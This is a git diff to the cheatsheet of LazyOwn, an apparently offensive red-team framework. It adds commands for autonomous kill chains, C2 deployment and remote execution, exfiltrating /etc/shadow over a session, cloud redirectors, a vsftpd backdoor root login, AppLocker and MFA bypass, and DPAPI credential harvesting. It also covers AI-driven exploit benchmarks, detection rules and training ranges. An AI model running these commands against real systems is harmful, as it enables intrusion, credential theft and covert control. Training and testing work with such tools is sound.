@@ -1,6 +1,6 @@
 # LazyOwn Cheatsheet — Frequent Commands by Goal
 
-This is the second-level reference. Start with `ESSENTIALS.md` first. Use this when you need the next layer of detail. For the full 333-command catalog, see `COMMANDS.md`.
+This is the second-level reference. Start with `ESSENTIALS.md` first. Use this when you need the next layer of detail. For the full 837-command catalog, see `COMMANDS.md`.
 
 ---
 
@@ -88,6 +88,10 @@ This is the second-level reference. Start with `ESSENTIALS.md` first. Use this w
 | Start metasploit handler | `msf` |
 | Generate + deliver beacon | `lazymsfvenom` |
 | Linux C beacon (BOF) | `blacksandbeacon` |
+| ExploitGym harness readiness | `egym status` |
+| List ExploitGym tasks | `egym list kernel --limit 5` |
+| Run exploit benchmark task | `egym run cve-XXXX --model claude` |
+| Score ExploitGym result (ELO) | `egym score cve-XXXX` |
 
 ---
 
@@ -117,17 +121,108 @@ This is the second-level reference. Start with `ESSENTIALS.md` first. Use this w
 
 ---
 
+## Marketplace, YARA & Nuclei
+
+| Goal | Command |
+|------|---------|
+| Browse YARA rules | `yara_marketplace list` |
+| Search YARA rules | `yara_marketplace search ransomware` |
+| Install YARA rule | `yara_marketplace install ransomware_detection` |
+| YARA rule info | `yara_marketplace info c2_framework_detection` |
+| Browse Nuclei templates | `nuclei_marketplace list` |
+| Search Nuclei by CVE | `nuclei_marketplace search --cve CVE-2024-xxxx` |
+| Search Nuclei by severity | `nuclei_marketplace search --severity critical` |
+| Install Nuclei template | `nuclei_marketplace install cve-2024-xxxx` |
+| Scan target with YARA | `yara_scan /path/to/file` |
+| Run Nuclei against rhost | `nuclei` |
+| Browse community addons | `marketplace list` |
+| Install community addon | `marketplace install <name>` |
+| Update all marketplace items | `marketplace update` |
+
+## Autonomous & Threat-Informed
+
+| Goal | Command |
+|------|---------|
+| Autonomous kill chain | `auto_pwn` |
+| Threat-informed recon | `hunt` |
+| Chain commands | `chain` |
+| Auto attack loop | `auto_loop` |
+| Full APT chain (one command) | `apt_chain apt_rocke 172.17.0.2` |
+| Resume a failed chain/loop | `retry status` → `retry chain <name> --var k=v` |
+| Elevate a retry run (guarded) | `retry chain <name> --sudo` (prints warning, waits for YES) |
+| Distill a loop trace into a chain | `chain_distill t0001 --write` |
+| Loop verb administration | `verb list addon` / `verb on addon:<name>` |
+| Interactive root shell on target | `atomic_shell --interactive 172.17.0.2` |
+| Cleanup artefacts / tear down gym | `atomic_clean 172.17.0.2` / `atomic_clean --hard 172.17.0.2` |
+| Generate playbook | `playbook_generate` |
+| Run playbook | `playbook_run` |
+
+---
+
 ## C2 / Implant Management
 
 | Goal | Command |
 |------|---------|
 | Start C2 server | `lazyc2` |
+| Headless C2 (start/status/stop) | `c2_server start` |
+| Reboot C2 with rotated creds | `c2_reboot` |
+| Deploy malleable agent to target | `c2_deploy 172.17.0.2` |
+| Run command on live session | `c2_exec msf-172-17-0-2 id` |
+| Exfiltrate file via session | `c2_loot msf-172-17-0-2 /etc/shadow` |
 | Open C2 dashboard | `cc` |
 | Team collaboration URL | `collab_join <handle>` |
 | Download beacon | `download_c2` |
 | Generate revshell | `createrevshell` |
 | Generate webshell | `createwebshell` |
 | Backdoor via netcat | `backdoor` |
+| Spawn disposable redirectors | `infra redirector spawn --count 2` |
+| List redirector URLs | `infra redirector list` |
+| Destroy redirectors | `infra redirector kill --all` |
+| Bake redirectors into beacon (order: spawn, assign, build) | `assign c2_fallback_urls <url1,url2>` then `c2 linux 2` |
+| Deploy local ephemeral C2 | `infra deploy --provider local` |
+| Deploy cloud C2 (DigitalOcean) | `infra deploy --provider digitalocean --region nyc1` |
+| Destroy ephemeral infra | `infra destroy --provider local` |
+| Infra status | `infra status` |
+
+---
+
+## Cyber Range (Training)
+
+| Goal | Command |
+|------|---------|
+| List range profiles | `lab range status` / `lab list` |
+| Start mini-AD range | `lab range start ad-mini` |
+| Prove range is exploitable (real root shell) | `lab range verify ad-mini` |
+| Stop mini-AD range | `lab range stop ad-mini` |
+| SSH into ws01 | `ssh -p 2222 -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no msfadmin@127.0.0.1` (password `msfadmin`) |
+| vsftpd backdoor to root shell | `USER backdoor:)` / `PASS x` on `127.0.0.1:2121`, shell on `127.0.0.1:6200` |
+| List gym challenges | `gym list` |
+| Active gyms and run ids | `gym status` |
+| Leaderboard | `gym top` |
+| Start a gym with a target | `gym start first_implant --target 172.20.0.20` |
+| Inspect one gym run | `gym status gym0001` |
+| Stop one gym by id or name | `gym stop first_implant` |
+| Stop every active gym | `gym stop` |
+| Deploy-implant challenge | `gym start first_implant` |
+| Lateral-movement challenge | `gym start lateral_ad` |
+| Exfiltration challenge | `gym start vault_exfil` |
+| Submit challenge | `gym submit --techniques implant_deploy,beacon_callback` |
+| Remove a stale world-model host | `rm_wm_host 127.0.0.1` |
+
+### Metasploitable 2 gym
+
+| Goal | Command |
+|------|---------|
+| Install gym prerequisites once | `sudo apt install -y chromium chromium-driver python3-selenium sshpass` |
+| Start the lab (applies migrations automatically) | `lab start metasploitable` |
+| Run the migrations by hand | `python3 -c "from modules.metasploitable_migrations import apply_migrations; print(apply_migrations('lazyown-lab-metasploitable'))"` |
+| List the 45 vectors | `gym_ms2 chains` |
+| Validate the matrix | `gym_ms2 validate` |
+| Run one vector end to end | `apt_chain gym_metasploitable_ms2_dvwa_sqli --target <ip> --json` |
+| Sweep-like chain dry run | `apt_chain gym_metasploitable_ms2_distcc_exec <ip> --dry-run` |
+| Check per-vector outcomes | `grep '"kind": "exploit"' sessions/outcomes.jsonl \| tail -45` |
+| Headless browser vectors (need chromium + selenium) | `apt_chain gym_metasploitable_ms2_dvwa_xss_dom / _twiki_xss / _mutillidae_csrf --target <ip>` |
+| Full setup guide | `docs/gym-setup.md` |
 
 ---
 
@@ -140,6 +235,8 @@ This is the second-level reference. Start with `ESSENTIALS.md` first. Use this w
 | List captured credentials | `credentials` |
 | TUI dashboard | `dashboard` |
 | Generate report | `report` |
+| Full multi-format report | `gen_report generate <name>` |
+| Report with AI executive summary | `gen_report generate <name> --with-ai --ai-backend groq` |
 | Red-team timeline | `timeline` |
 
 ---
@@ -155,6 +252,24 @@ This is the second-level reference. Start with `ESSENTIALS.md` first. Use this w
 | Query knowledge base | `parquet_query` |
 | Semantic search sessions | `rag_query` |
 | Threat model | `threat_model` |
+| LLM daily cost cap | `llm_budget` |
+
+---
+
+## Security & Crypto
+
+| Goal | Command |
+|------|---------|
+| Encrypt file | `encrypt <path> <key>` |
+| Decrypt file | `decrypt <path> <key>` |
+| YARA scan | `yara_scan <file>` |
+| YARA marketplace | `yara_marketplace list` |
+| Nuclei scan | `nuclei` |
+| Nuclei marketplace | `nuclei_marketplace list` |
+| AppLocker bypass | `applocker_bypass_csc` |
+| EDR detection | `edr_detect` |
+| DPAPI harvest | `dpapi_harvest` |
+| MFA bypass toolkit | `mfa_bypass` |
 
 ---
 
@@ -185,6 +300,6 @@ The framework reads `rhost`, `wordlist`, `lhost`, `lport`, `domain`, `start_user
 | 1 | `ESSENTIALS.md` | ~120 | You are new or need the golden path |
 | 2 | `CHEATSHEET.md` | ~300 | You know the basics, need the next layer |
 | 3 | `QUICKSTART.md` | ~200 | Setting up for the first time |
-| 4 | `COMMANDS.md` | ~5000 | You need the complete 333-command reference |
+| 4 | `COMMANDS.md` | ~1600 | You need the complete 837-command reference |
 | 5 | `skills/lazyown.md` | ~1600 | You are an AI operator using MCP tools |
 | 6 | `CLAUDE.md` | ~540 | You are developing or extending the framework |
